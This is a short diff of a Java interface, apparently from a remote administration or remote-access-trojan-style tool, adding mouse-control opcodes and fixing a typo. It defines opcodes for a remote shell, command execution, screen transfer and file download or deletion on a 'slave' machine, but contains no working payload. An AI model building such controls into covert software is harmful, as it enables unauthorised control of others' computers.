@@ -8,7 +8,7 @@ public interface Slave {
 	int PORT = 43596;
 	/** Opcodes */
 	int INTENT_CHECK = 0, INTENT_CONNECT = 1, INTENT_CHECK_BULK = 2, INTENT_REBUILD = 8;
-	int OP_HANDSHAKE = 0, OP_TRANSFER_IMAGE = 1, OP_DO_COMMAND = 2, OP_GET_FILES = 3, OP_FILE_ACTION = 4, OP_REMOTE_SHELL = 6, OP_LEFT_MOUSE_DOWN = 7, OP_LEFT_MOUSE_UP = 8;
+	int OP_HANDSHAKE = 0, OP_TRANSFER_IMAGE = 1, OP_DO_COMMAND = 2, OP_GET_FILES = 3, OP_FILE_ACTION = 4, OP_REMOTE_SHELL = 6, OP_MOUSE_MOVE = 7, OP_LEFT_MOUSE_DOWN = 8, OP_LEFT_MOUSE_UP = 9, OP_RIGHT_MOUSE_DOWN = 10, OP_RIGHT_MOUSE_UP = 11;
 	/** File manipulation opcodes */
 	int FOP_GET_INFO = 0, FOP_DOWNLOAD = 1, FOP_RENAME = 2, FOP_DELETE = 3;
 
@@ -19,7 +19,7 @@ public interface Slave {
 	String getOS();
 
 	/**
-	 * Sets the operating sytem for this slave
+	 * Sets the operating system for this slave
 	 * @param os
 	 */
 	void setOS(final String os);
